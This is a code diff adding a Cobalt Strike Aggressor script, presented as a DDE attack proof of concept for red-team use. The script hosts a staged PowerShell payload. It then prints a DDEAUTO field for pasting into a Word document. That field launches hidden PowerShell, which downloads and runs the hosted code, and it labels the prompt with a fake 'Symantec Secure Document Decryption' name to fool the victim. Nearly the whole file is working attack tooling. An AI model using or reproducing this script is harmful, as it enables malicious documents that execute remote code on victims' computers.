@@ -1,0 +1,49 @@
+# DDE Attack and CS PoC Aggressor Script(Staged)
+#
+# Author: Matt Ettelaie (github.com/p292) (https://uk.linkedin.com/in/mettelaie)
+# KPMG UK Cyber Defence Services - kpmg.co.uk/cyber
+# Credits to @armitagehacker for the original template script
+# Credits to @sensepost - https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
+
+# setup our stage(d) Web Delivery attack
+sub setup_attack {
+	local('%options $script $url $arch');
+	%options = $3;
+
+	# get the arch right.
+	$arch = iff(%options["x64"] eq "true", "x64", "x86");
+
+	# create powershell script oneliner to host
+	$script = powershell(%options["listener"], , $arch);
+	
+	# host the script!
+	$url = site_host(%options["host"], %options["port"], %options["uri"], $script, "text/plain", "DDEAuto (Staged)"); 
+
+	# tell the user what text to insert into word
+	prompt_text("Open Word, press CTRL-F9 and then paste the text below between the brackets into a Word Document: ", "DDEAUTO \"C:\\\\Programs\\\\Microsoft\\\\Office\\\\MSWord\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -NoP -sta -NonI -W Hidden IEX (New-Object System.Net.WebClient).DownloadString('" . $url . "'); # \" \"Symantec Secure Document Decryption\"", {});
+}
+
+# create a popup menu!
+popup attacks {
+	item "DDEAUTO Word Staged Exploit" {
+		local('$dialog %defaults');
+
+		# setup our defaults
+		%defaults["uri"]  = "/dde";
+		%defaults["host"] = localip();
+		%defaults["port"] = 80;
+
+		# create our dialog
+		$dialog = dialog("DDEAUTO Word (Staged)", %defaults, &setup_attack);
+		dialog_description($dialog, "A staged version of the DDEAUTO attack.");
+		drow_text($dialog, "uri", "URI Path: ", 20);
+		drow_text($dialog, "host", "Local Host: ");
+		drow_text($dialog, "port", "Local Port: ");
+		drow_listener_stage($dialog, "listener", "Listener: ");
+		drow_checkbox($dialog, "x64", "x64: ", "Use x64 payload");
+		dbutton_action($dialog, "Launch");
+
+		# show our dialog
+		dialog_show($dialog);
+	}
+}
